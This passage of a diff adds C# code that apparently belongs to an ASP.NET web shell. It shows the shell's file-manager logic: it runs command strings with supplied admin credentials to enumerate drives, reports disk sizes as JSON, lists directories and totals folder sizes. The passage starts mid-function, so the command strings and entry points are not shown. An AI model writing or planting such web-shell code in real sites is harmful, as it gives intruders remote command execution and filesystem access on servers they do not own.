@@ -1,0 +1,48 @@
+                                string f = string.Format(strWF, tmp, i);
+                                string[] lDisk = System.IO.File.ReadAllLines(f);
+                                exec(string.Format(strWD, f));
+                                for (int j = 1; j < lDisk.Length; j++)
+                                {
+                                    if (i == 1) diskTemp[j - 1] = lDisk[j];
+                                    else diskTemp[j - 1] += "|" + lDisk[j];
+                                }
+                            }
+                            ret = "{\"dir\":[";
+                            bool isStart = false;
+                            foreach (string item in diskTemp)
+                            {
+                                if (!string.IsNullOrEmpty(item))
+                                {
+                                    string[] diskInfo = item.Split('|');
+                                    long TotalSize = 0;
+                                    long TotalFreeSpace = 0;
+                                    long.TryParse(diskInfo[2], out TotalSize);
+                                    long.TryParse(diskInfo[3], out TotalFreeSpace);
+                                    if (isStart)
+                                        ret += ",";
+                                    ret += string.Format("{{\"name\":\"{0}\",\"totalSize\":\"{1}\",\"freeSpace\":\"{2}\",\"sizeText\":\"{3}\",\"format\":\"{4}\",\"type\":\"{5}\"}}", diskInfo[0].TrimEnd('\\').TrimEnd(' ').TrimEnd(':') + "$", TotalSize, TotalFreeSpace, "[" + sizeFix(TotalFreeSpace) + "] free of [" + sizeFix(TotalSize) + "]", diskInfo[1], diskInfo[4]);
+                                    isStart = true;
+                                }
+                            }
+                            ret += "]}";
+                        } else
+                            ret ="Error : Admin Username or Password is empty";
+                    }
+                } else{
+                    System.IO.FileAttributes attr=System.IO.File.GetAttributes(address);
+                    if ((attr & System.IO.FileAttributes.Directory)==System.IO.FileAttributes.Directory){
+                        System.IO.DirectoryInfo dirInfo=new System.IO.DirectoryInfo(address);
+                        ret ="{"+string.Format("{0},{1}",createJsonDirectory(dirInfo.GetDirectories()),createJsonFile(dirInfo.GetFiles()))+"}";
+                    }
+                }
+            }
+        } catch(Exception ex){
+            ret ="Error : "+ex.Message;
+        }
+        return ret;
+    }
+    void exp(string exadd){string ret="Error : -";ret=getDirectoryInfo(exadd);response(ret);}
+    bool hasErrorInGetSize=false;
+    int sizelvl=0;
+    string sizeError;
+    long GetDirSize(System.IO.DirectoryInfo d){long size=0;try{System.IO.FileInfo[] fis=d.GetFiles();foreach(System.IO.FileInfo fi in fis){size+=fi.Length;}sizelvl++;System.IO.DirectoryInfo[] dis=d.GetDirectories();foreach(System.IO.DirectoryInfo di in dis){size+=GetDirSize(di);}}catch(UnauthorizedAccessException ex){sizeError="Error : "+ex.Message;hasErrorInGetSize=true;}return size;}
